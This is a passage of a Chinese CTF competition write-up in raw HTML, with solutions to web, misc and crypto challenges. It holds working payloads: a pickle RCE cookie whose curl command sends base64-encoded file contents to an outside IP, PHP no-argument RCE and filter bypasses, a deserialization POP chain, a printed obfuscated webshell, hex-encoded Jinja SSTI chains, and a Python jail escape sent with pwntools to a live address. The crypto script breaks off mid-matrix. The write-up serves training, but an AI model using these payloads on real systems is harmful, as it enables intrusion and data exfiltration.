class="built_in">eval</span>, (<span class="string">&quot;os.system(&#x27;curl http://IP/look?file=`cat /fllll11llaaaa0ggg | base64`&#x27;)&quot;</span>,)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = touni(cookie_encode((<span class="string">&quot;user&quot;</span>, &#123;<span class="string">&quot;user&quot;</span>: PickleRce()&#125;), sekai))</span><br><span class="line">requests.get(<span class="string">&quot;http://xx.xx.xx.xx:4902/login&quot;</span>, cookies=&#123;<span class="string">&quot;user&quot;</span>: <span class="string">f&quot;\&quot;<span class="subst">&#123;payload&#125;</span>\&quot;&quot;</span>&#125;)</span><br></pre></td></tr></table></figure><p><img src="/img/image-20241119151650586.png" alt="image-20241119151650586"></p><h3 id="May-be"><a href="#May-be" class="headerlink" title="May_be"></a>May_be</h3><p>php无参数RCE</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$a</span>))  &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/sess|ion|head|ers|file|na|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&quot;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;May be you should bypass.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用全局变量进RCE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=system(end(reset(get_defined_vars())));&amp;b=ls -al /</span><br></pre></td></tr></table></figure><p><img src="/img/image-20241119151924262.png" alt="image-20241119151924262"></p><p>cp提权</p><p><img src="/img/image-20241119151945027.png" alt="image-20241119151945027"></p><h3 id="Hackerconfused"><a href="#Hackerconfused" class="headerlink" title="Hackerconfused"></a>Hackerconfused</h3><p>利用glob协议猜后门文件名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">构造pop链读文件</span><br><span class="line">Fun::__destruct -&gt; Fun::__toString -&gt; Funny::__toString -&gt; Funny::__destruct</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SFile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Funny</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// $obj = new Fun;</span></span><br><span class="line"><span class="comment">// $obj -&gt; secret = new SFile;</span></span><br><span class="line"><span class="comment">// $obj -&gt; secret -&gt; name = &quot;glob://backdoor_a5f9d*.php&quot;;</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Fun</span>;</span><br><span class="line"><span class="variable">$obj</span> -&gt; secret = <span class="keyword">new</span> <span class="title class_">Fun</span>;</span><br><span class="line"><span class="variable">$obj</span> -&gt; secret -&gt; secret = <span class="keyword">new</span> <span class="title class_">Funny</span>;</span><br><span class="line"><span class="variable">$obj</span> -&gt; secret -&gt; secret -&gt; name = <span class="string">&quot;backdoor_a5f9d3.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>));</span><br></pre></td></tr></table></figure><p>后门文件</p><p><img src="/img/image-20241119152121487.png" alt="image-20241119152121487"></p><p>爆破解密，获取webshell密码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$erzo_f851f55b</span>=[<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;ZmxhZ3sjX2FiY2RlZn0=&#x27;</span>),<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;ZmxhZ3tiMHdfYjB3fQ==&#x27;</span>),<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;ZmxhZ3t0ZXRfZmxhZ30=&#x27;</span>),<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;ZmxhZ3s5OSF6elN3Y30=&#x27;</span>),<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;ZmxhZ3tkZWJ1R19mdHd9&#x27;</span>),<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;ZmxhZ3toZWxsX3llYWh9&#x27;</span>),<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;ZmxhZ3t0NHN0fQ==&#x27;</span>)];<span class="variable">$igxc_9ce88802</span>=<span class="string">&#x27;&#x27;</span>;<span class="variable">$bbmg_1b267619</span>=<span class="number">0</span>;<span class="keyword">foreach</span>(<span class="variable">$erzo_f851f55b</span> <span class="keyword">as</span>&amp;<span class="variable">$djkg_417c4fa3</span>)&#123;<span class="variable">$igxc_9ce88802</span>=<span class="variable">$djkg_417c4fa3</span>[<span class="variable">$bbmg_1b267619</span>].<span class="variable">$igxc_9ce88802</span>;<span class="variable">$bbmg_1b267619</span>++;&#125;;<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="variable">$igxc_9ce88802</span>]))&#123;<span class="variable">$grxe_fd6b6fc9</span>=<span class="variable">$_GET</span>[<span class="variable">$igxc_9ce88802</span>];<span class="variable">$pgck_32cfe6c1</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$grxe_fd6b6fc9</span>);<span class="variable">$jipp_8a561003</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$pgck_32cfe6c1</span>,<span class="number">5</span>,-<span class="number">5</span>);<span class="keyword">echo</span> <span class="variable">$jipp_8a561003</span>;<span class="title function_ invoke__">system</span>(<span class="variable">$jipp_8a561003</span>);&#125;<span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;NDA0&#x27;</span>);&#125;;</span><br><span class="line"><span class="comment">//pass 4h&#123;galf</span></span><br></pre></td></tr></table></figure><p><img src="/img/image-20241119152154342.png" alt="image-20241119152154342"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;73XF7TntgDXrK3dQXSBvhuy3QJTH4vvr&#125;</span><br></pre></td></tr></table></figure><h3 id="notrce"><a href="#notrce" class="headerlink" title="notrce"></a>notrce</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/vi|less|tail|head|od|sh|echo|touch|re|mv|rm|cat|ls|tac|more|cut|curl|wget|base|&gt;|&lt;|`|\*|\\$|\\\/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没过滤引号、问号、sed</p><p><img src="/img/image-20241119152255132.png" alt="image-20241119152255132"></p><p><img src="/img/image-20241119152309681.png" alt="image-20241119152309681"></p><h3 id="完美网站"><a href="#完美网站" class="headerlink" title="完美网站"></a>完美网站</h3><p>文件包含读tupian.png，下载下来</p><p><img src="/img/image-20241119152356260.png" alt="image-20241119152356260"></p><p>一个简单计算，放Burp爆破</p><p><img src="/img/image-20241119152422239.png" alt="image-20241119152422239"></p><h3 id="it-‘s-time"><a href="#it-‘s-time" class="headerlink" title="it ‘s time"></a>it ‘s time</h3><p>Python SSTI</p><p>遍历可用类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(<span class="number">0</span>|attr(<span class="string">&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5f\x62\x61\x73\x65\x73\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;</span>)(<span class="number">0</span>)|attr(<span class="string">&quot;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&quot;</span>)()|attr(<span class="string">&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;</span>)(<span class="number">202</span>)|attr(<span class="string">&quot;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;</span>))%&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/image-20241119152540368.png" alt="image-20241119152540368"></p><p>os._wrap_close调popen</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(<span class="number">0</span>|attr(<span class="string">&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5f\x62\x61\x73\x65\x73\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;</span>)(<span class="number">0</span>)|attr(<span class="string">&quot;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&quot;</span>)()|attr(<span class="string">&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;</span>)(<span class="number">117</span>)|attr(<span class="string">&quot;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;</span>)(<span class="string">&quot;\x70open&quot;</span>)(<span class="string">&quot;\x63\x61\x74\x20\x2f\x66\x31\x61\x67\x5f\x67\x34\x6c\x66\x63\x64\x65\x63\x64\x64\x65\x66\x65\x77\x66\x65\x62\x67\x65&quot;</span>)|attr(<span class="string">&quot;read&quot;</span>)())%&#125;</span><br></pre></td></tr></table></figure><h3 id="不太喜欢flask的开发"><a href="#不太喜欢flask的开发" class="headerlink" title="不太喜欢flask的开发"></a>不太喜欢flask的开发</h3><p>弱口令、猜jwt key 也为tomcat</p><p><img src="/img/image-20241119152700995.png" alt="image-20241119152700995"></p><p>发现还是SSTI，发现过滤了下划线 read，部分编码绕过读文件</p><p><img src="/img/image-20241119152719378.png" alt="image-20241119152719378"></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="time"><a href="#time" class="headerlink" title="time"></a>time</h3><p>时间戳</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">chr</span>(<span class="title function_">int</span>(os.<span class="property">path</span>.<span class="title function_">getmtime</span>(file.<span class="property">txt</span>)-<span class="number">1124789000</span>))</span><br><span class="line"><span class="comment">// flag&#123;e30da940eef9718f1dbc4a0d0cde1ecb&#125;</span></span><br></pre></td></tr></table></figure><h3 id="传说中的小黑"><a href="#传说中的小黑" class="headerlink" title="传说中的小黑"></a>传说中的小黑</h3><p>分离之后解密获取密码，补个jpg头</p><p>FFD8FFE0</p><p><img src="/img/image-20241119152912049.png" alt="image-20241119152912049"></p><h3 id="wordexcelppt"><a href="#wordexcelppt" class="headerlink" title="wordexcelppt"></a>wordexcelppt</h3><p>kali打开发现隐藏xml</p><p><img src="/img/image-20241119152950426.png" alt="image-20241119152950426"></p><p>base64转图片</p><p><img src="/img/image-20241119153008079.png" alt="image-20241119153008079"></p><h3 id="图片的秘密"><a href="#图片的秘密" class="headerlink" title="图片的秘密"></a>图片的秘密</h3><p><img src="/img/image-20241119153046130.png" alt="image-20241119153046130"></p><h3 id="easymisc"><a href="#easymisc" class="headerlink" title="easymisc"></a>easymisc</h3><p>docker load –input .&#x2F;game.tar</p><p><img src="/img/image-20241119153123763.png" alt="image-20241119153123763"></p><p>559.gif拖出来 拼二维码</p><p><img src="/img/image-20241119153143052.png" alt="image-20241119153143052"></p><h3 id="cb0x-new"><a href="#cb0x-new" class="headerlink" title="cb0x-new"></a>cb0x-new</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> * <span class="title function_">test</span><span class="params">(<span class="type">char</span> *aaa)</span>&#123;</span><br><span class="line"> <span class="built_in">puts</span>(aaa);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Base64 encode</p><p><img src="/img/image-20241119153248890.png" alt="image-20241119153248890"></p><p><img src="/img/image-20241119153305351.png" alt="image-20241119153305351"></p><h3 id="j-il-new"><a href="#j-il-new" class="headerlink" title="j@il-new"></a>j@il-new</h3><p>python jail逃逸</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;(__builtins__:=__import__(&#x27;os&#x27;))and(lambda:system)()(&#x27;sh&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote</span><br><span class="line">payload = <span class="string">&quot;(__builtins__:=__import__(&#x27;os&#x27;))and(lambda:system)()(&#x27;sh&#x27;)&quot;</span></span><br><span class="line">io = remote(<span class="string">&quot;47.93.30.67&quot;</span>, <span class="number">62091</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;: &#x27;</span>, payload.encode())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/img/image-20241119153424641.png" alt="image-20241119153424641"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="math"><a href="#math" class="headerlink" title="math"></a>math</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">E = Matrix(GF(<span class="number">71</span>),[[<span class="number">48</span>,<span class="number">11</span>,<span class="number">39</span>,<span class="number">15</span>,<span class="number">22</span>,<span class="number">11</span>,<span class="number">52</span>,<span class="number">59</span>,<span class="number">39</span>,<span class="number">11</span>,<span class="number">61</span>],</span><br><span class="line">[<span class="number">16</span>,<span class="number">56</span>,<span class="number">43</span>,<span class="number">35</span>,<span class="number">36</span>,<span class="number">48</span>,<span class="number">40</span>,<span class="number">9</span>,<span class="number">19</span>,<span class="number">50</span>,<span class="number">65</span>],</span><br><span class="line">[<span class="number">10</span>,<span class="number">48</span>,<span class="number">40</span>,<span class="number">29</span>,<span class="number">70</span>,<span class="number">29</span>,<span class="number">12</span>,<span class="number">33</span>,<span class="number">36</span>,<span class="number">27</span>,<span class="number">67</span>],</span><br><span class="line">[<span class="number">57</span>,<span class="number">38</span>,<span class="number">26</span>,<span class="number">61</span>,<span class="number">64</span>,<span class="number">70</span>,<span class="number">37</span>,<span class="number">45</span>,<span class="number">70</span>,<span class="number">1</span>,<span class="number">39</span>],</span><br><span class="line">[<span class="number">58</span>,<span class="number">44</span>,<span class="number">20</span>,<span class="number">58</span>,<span class="number">26</span>,<span class="number">42</span>,<span class="number">31</span>,<span class="number">33</span>,<span class="number">10</span>,<span class="number">28</span>,<span class="number">69</span>],</span><br><span class="line">[<span class="number">26</span>,<span class="number">55</span>,<span class="number">27</span>,<span class="number">57</span>,<span class="number">69</span>,<span class="number">45</span>,<span class="number">52</span>,<span class="number">62</span>,<span class="number">55</span>,<span class="number">6</span>,<span class="number">24</span>],</span><br><span class="line">[<span class="number">45</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">65</span>,<span class="number">16</span>,<span class="number">60</span>,<span class="number">54</span>,<span class="number">45</span>,<span class="number">25</span>,<span class="number">22</span>,<span class="number">32</span>],</span><br><span class="line">[<span class="number">33</span>,<span class="number">20</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">25</span>,<span class="number">56</span>,<span class="number">15</span>,<span class="number">70</span>,<span class="number">44</span>,<span class="number">25</span>,<span class="number">69</span>],</span><br><span class="line">[<span class="number">30</span>,<span class="number">62</span>,<span class="number">23</span>,<span class="number">9</span>,<span class="number">45</span>,<span class="number">15</span>,<span class="number">70</span>,<span class="number">0</span>,<span class="number">20</span>,<span class="number">20</span>,<span class="number">15</span>],</span><br><span class="line">[<span class="number">24</span>,<span class="number">1</span>,<span class="number">41</span>,<span class="number">24</span>,<span class="number">70</span>,<span class="number">70</span>,<span class="number">42</span>,<span class="number">59</span>,<span class="number">18</span>,<span class="number">0</span>,<span class="number">29</span>],</span><br><span class="line">[<span class="number">0</span>,<span class="number">2</span>,<span class="number">23</span>,<span class="number">17</span>,<span class="number">67</span>,<span class="number">52</span>,<span class="number">57</span>,<span class="number">68</span>,<span class="number">58</span>,<span class="number">65</span>,<span class="number">46</span>]])</span><br><span class="line"></span><br><span class="line">hint1 = Matrix(GF(<span class="number">71</span>),[[<span class="number">29</span>,<span class="number">60</span>,<span class="number">16</span>,<span class="number">59</span>,<span class="number">40</span>,<span class="number">4</span>,<span class="number">34</span>,<span class="number">57</span>,<span class="number">1</span>,<span class="number">55</span>,<span class="number">67</span>],</span><br><span class="line">[<span class="number">9</span>,<span class="number">1</span>,<span class="number">44</span>,<span class="number">67</span>,<span class="number">5</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">6</span>,<span class="number">42</span>,<span class="number">66</span>,<span class="number">25</span>],</span><br><span class="line">[<span class="number">44</span>,<span class="number">1</span>,<span class="number">24</span>,<span class="number">69</span>,<span class="number">24</span>,<span class="number">23</span>,<span class="number">3</span>,<span class="number">43</span>,<span class="number">42</span>,<span class="number">20</span>,<span class="number">52</span>],</span><br><span class="line">[<span class="number">47</span>,<span class="number">63</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">50</span>,<span class="number">35</span>,<span class="number">11</span>,<span class="number">22</span>,<span class="number">59</span>,<span class="number">35</span>,<span class="number">0</span>],</span><br><span class="line">[<span class="number">19</span>,<span class="number">7</span>,<span class="number">36</span>,<span class="number">59</span>,<span class="number">64</span>,<span class="number">2</span>,<span class="number">50</span>,<span class="number">47</span>,<span class="number">30</span>,<span class="number">7</span>,<span class="number">31</span>],</span><br><span class="line">[<span class="number">19</span>,<span class="number">24</span>,<span class="number">48</span>,<span class="number">2</span>,<span class="number">32</span>,<span class="number">41</span>,<span class="number">60</span>,<span class="number">43</span>,<span class="number">50</span>,<span class="number">60</span>,<span class="number">32</span>],</span><br><span class="line">[<span class="number">31</span>,<span class="number">11</span>,<span class="number">62</span>,<span class="number">11</span>,<span class="number">68</span>,<span class="number">27</span>,<span class="number">57</span>,<span class="number">4</span>,<span class="number">66</span>,<span class="number">38</span>,<span class="number">46</span>],</span><br><span class="line">[<span class="number">25</span>,<span class="number">30</span>,<span class="number">63</span>,<span class="number">52</span>,<span class="number">36</span>,<span class="number">65</span>,<span class="number">61</span>,<span class="number">25</span>,<span class="number">22</span>,<span class="number">4</span>,<span class="number">64</span>],</span><br><span class="line">[<span class="number">38</span>,<span class="number">35</span>,<span class="number">39</span>,<span class="number">2</span>,<span class="number">43</span>,<span class="number">39</span>,<span class="number">67</span>,<span class="number">57</span>,<span class="number">19</span>,<span class="number">26</span>,<span class="number">21</span>],</span><br><span class="line">[<span class="number">14</span>,<span class="number">25</span>,<span class="number">14</span>,<span class="number">40</span>,<span class="number">30</span>,<span class="number">52</span>,<span class="number">70</span>,<span class="number">45</span>,<span class="number">70</span>,<span class="number">5</span>,<span class="number">55</span>],</span><br><span class="line">[<span class="number">10</span>,<span class="number">6</span>,<span class="number">18</span>,<span class="number">32</span>,<span class="number">3</span>,<span class="number">20</span>,<span class="number">23</span>,<span class="number">52</span>,<span class="number">25</span>,<span class="number">45</span>,<span class="number">27</span>]])</span><br><span class="line"></span><br><span class="line">hint2=Matrix(GF(<span class="number">71</span>),[[<span class="number">25</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">18</span>,<span class="number">22</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">68</span>,<span class="number">21</span>,<span class="number">57</span>,<span class="number">61</span>],</span><br><span class="line">[<span class="number">34</span>,<span class="number">23</span>,<span class="number">10</span>,<span class="number">47</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">61</span>,<span class="number">26</span>,<span class="number">70</span>,<span class="number">6</span>,<span class="number">20</span>],</span><br><span class="line">[<span class="number">31</span>,<span class="number">28</span>,<span class="number">23</span>,<span class="number">42</span>,<span class="number">63</span>,<span class="number">21</span>,<span class="number">19</span>,<span class="number">16</span>,<span class="number">21</span>,<span class="number">20</span>,<span class="number">14</span>],</span><br><span class="line">[<span class="number">27</span>,<span class="number">48</span>,<span class="number">28</span>,<span class="number">17</span>,<span class="number">1</span>,<span class="number">64</span>,<span class="number">30</span>,<span class="number">49</span>,<span class="number">4</span>,<span class="number">62</span>,<span class="number">48</span>],</span><br><span class="line">[<span class="number">51</span>,<span class="number">67</span>,<span class="number">8</span>,<span class="number">28</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">19</span>,<span class="number">27</span>,<span class="number">5</span>],</span><br><span class="line">[<span class="number">25</span>,<span class="number">30</span>,<span class="number">48</span>,<span class="number">41</span>,<span class="number">8</span>,<span class="number">55</span>,<span class="number">10</span>,<span class="number">18</span>,<span class="number">61</span>,<span class="number">38</span>,<span class="number">35</span>],</span><br><span class="line">[<span class="number">8</span>,<span class="number">45</span>,<span class="number">69</span>,<span class="number">64</span>,<span class="number">55</span>,<span class="number">33</span>,<span class="number">15</span>,<span class="number">21</span>,<span class="number">3</span>,<span class="number">41</span>,<span class="number">59</span>],</span><br><span class="line">[<span class="number">53</span>,<span class="number">15</span>,<span class="number">56</span>,<span class="number">53</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">52</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">40</span>,<span class="number">48</span>],</span><br><span class="line">[<span class="number">31</span>,<span class="number">63</span>,<span class="number">42</span>,<span class="number">18</span>,<span class="number">37</span>,<span class="number">56</span>,<span class="number">32</span>,<span class="number">5</span>,<span class="number">70</span>,<span class="number">11</span>,<span class="number">15</span>],</span><br><span class="line">[<span class="number">56</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">46</span>,<span class="number">5</span>,<span class="number">68</span>,<span class="number">24</span>,<span class="number">70</span>,<span class="number">64</span>,<span class="number">27</span>,<span class="number">25</span>],</span><br><span class="line">[<span class="number">44</span>,<span class="number">69</span>,<span class="number">65</span>,<span class="number">13</span>,<span class="number">70</span>,<span class="number">17</span>,<span class="number">16</span>,<span class="number">30</span>,<span class="number">39</span>,<span class="number">56</span>,<span class="number">62</span>]])</span><br><span class="line"></span><br><span class="line">hint3=Matrix(GF(<span class="number">71</span>),[[<span class="number">64</span>,<span class="number">53</span>,<span class="number">46</span>,<span class="number">34</span>,<span class="number">58</span>,<span class="number">23</span>,<span class="number">63</span>,<span class="number">8</span>,<span class="number">58</span>,<span class="number">17</span>,<span class="number">34</span>],</span><br><span class="line">[<span class="number">9</span>,<span class="number">29</span>,<span class="number">67</span>,<span class="number">42</span>,<span class="number">10</span>,<span class="number">35</span>,<span class="number">16</span>,<span class="number">53</span>,<span class="number">29</span>,<span class="number">55</span>,<span class="number">53</span>],</span><br><span class="line">[<span class="number">46</span>,<span class="number">20</span>,<span class="number">7</span>,<span class="number">56</span>,<span class="number">47</span>,<span class="number">20</span>,<span class="number">61</span>,<span class="number">38</span>,<span class="number">11</span>,<span class="number">37</span>,<span class="number">67</span>],</span><br><span class="line">[<span class="number">54</span>,<span class="number">0</span>,<span class="number">53</span>,<span class="number">26</span>,<span class="number">38</span>,<span class="number">46</span>,<span class="number">62</span>,<span class="number">18</span>,<span class="number">9</span>,<span class="number">33</span>,<span class="number">57</span>],</span><br><span class="line">[<span class="number">54</span>,<span class="number">44</span>,<span class="number">59</span>,<span class="number">53</span>,<span class="number">18</span>,<span class="number">40</span>,<span class="number">58</span>,<span class="number">56</span>,<span class="number">38</span>,<span class="number">40</span>,<span class="number">45</span>],</span><br><span class="line">[<span class="number">37</span>,<span class="number">24</span>,<span class="number">10</span>,<span class="number">29</span>,<span class="number">41</span>,<span class="number">5</span>,<span class="number">58</span>,<span class="number">24</span>,<span class="number">20</span>,<span class="number">46</span>,<span class="number">49</span>],</span><br><span class="line">[<span class="number">19</span>,<span class="number">63</span>,<span class="number">18</span>,<span class="number">7</span>,<span class="number">37</span>,<span class="number">46</span>,<span class="number">41</span>,<span class="number">62</span>,<span class="number">58</span>,<span class="number">59</span>,<span class="number">21</span>],</span><br><span class="line">[<span class="number">60</span>,<span class="number">45</span>,<span class="number">44</span>,<span class="number">12</span>,<span class="number">21</span>,<span class="number">9</span>,<span class="number">63</span>,<span class="number">67</span>,<span class="number">50</span>,<span class="number">31</span>,<span class="number">18</span>],</span><br><span class="line">[<span class="number">36</span>,<span class="number">68</span>,<span class="number">19</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">61</span>,<span class="number">34</span>,<span class="number">49</span>,<span class="number">21</span>,<span class="number">11</span>,<span class="number">58</span>],</span><br><span class="line">[<span class="number">5</span>,<span class="number">35</span>,<span 